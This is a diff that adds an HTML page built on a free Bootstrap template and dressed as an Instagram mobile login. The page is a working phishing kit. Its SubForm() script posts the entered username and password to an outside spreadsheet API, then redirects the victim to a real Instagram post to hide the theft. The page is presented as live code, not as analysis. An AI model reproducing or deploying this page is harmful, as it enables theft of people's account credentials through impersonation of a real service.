@@ -1,0 +1,74 @@
+<!-- W3hubs.com - Download Free Responsive Website Layout Templates designed on HTML5 CSS3,Bootstrap which are 100% Mobile friendly. w3Hubs all Layouts are responsive cross browser supported, best quality world class designs. -->
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Instagram Mobile Login Page In Bootstrap 4 - W3hubs.com</title>
+	<meta charset="utf-8">
+	<meta name="description" content="w3hubs.com">
+  <meta name="author" content="w3hubs.com">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
+<link rel="stylesheet" type="text/css" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+	<script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+<script>
+function SubForm (){
+    $.ajax({
+        url:'https://api.apispreadsheets.com/data/637/',
+        type:'post',
+        data:$("#myForm").serializeArray(),
+        success: function(){
+
+          alert("Loading...")
+location.replace("https://www.instagram.com/p/CCNlhpHACvk/");
+
+
+        },
+        error: function(){
+          alert("error")
+        }
+    });
+}
+</script>
+	<section id="w3hubs">
+
+		<div class="container">
+		
+			<h1>Instagram</h1>
+ <form id="myForm">
+ 			 <div class="form-group">
+			   
+			    <input type="name" class="form-control" placeholder="Phone number,username, or email" name="Message1">
+			  </div>
+			  <div class="form-group">
+			   
+			    <input type="password" class="form-control" placeholder="Password" name="Message1">
+			  </div>
+			  </form>
+ <button class="btn btn-primary" onclick="SubForm()">Log In</button>			
+			<h4>OR</h4>
+			<p><i class="fa fa-facebook-square"></i><a href="#">Log In Facebook</a></p>
+			<p><a href="#">Forget Password</a></p>
+</div>
+			<div class="box">
+				<p>Don't have account? <a href="#">Sign up</a></p>
+			</div>
+		
+	
+	</section>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-125951040-1"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-125951040-1');
+</script>
+</body>
+</html>
